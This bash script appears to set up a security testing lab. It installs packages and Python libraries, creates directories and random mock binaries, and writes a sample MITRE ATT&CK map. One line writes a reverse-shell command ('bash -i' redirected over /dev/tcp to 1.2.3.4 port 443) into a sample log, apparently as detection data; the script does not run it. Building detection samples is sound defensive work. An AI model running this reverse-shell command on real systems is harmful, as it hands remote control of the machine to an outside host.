#!/bin/bash

# s Lab Setup Script
# Prepares host system for full module testing (dashboard, OTA, AI, firmware analysis)

echo "[+] Updating packages..."
sudo apt update && sudo apt install -y \
    git python3 python3-pip \
    docker.io qemu-system-arm \
    rtl-sdr build-essential \
    iptables net-tools curl unzip \
    python3-venv

echo "[+] Installing Python libraries..."
pip3 install --upgrade pip
pip3 install flask websockets transformers torch psutil openai

echo "[+] Creating directory layout..."
mkdir -p logs/dashboard
mkdir -p results
mkdir -p logs/ota_streams
mkdir -p sandbox

echo "[+] Creating sample memory file..."
dd if=/dev/urandom of=/tmp/mem.bin bs=1M count=1

echo "[+] Creating simulated OTA binary stream..."
dd if=/dev/urandom of=logs/ota_streams/ota_stream.bin bs=4K count=10

echo "[+] Creating sample log file for classification..."
echo "Suspicious shell execution: bash -i >& /dev/tcp/1.2.3.4/443 0>&1" > logs/sample.log

echo "[+] Creating MITRE map example..."
cat <<EOF > results/mitre_map.json
{
  "Execution": {
    "Command-Line Interface": "2025-07-01T12:30:21Z"
  },
  "Persistence": {
    "Startup Folder": "2025-07-01T12:33:01Z"
  }
}
EOF

echo "[✓] Lab setup complete. You may now launch modules manually or integrate into the dashboard."
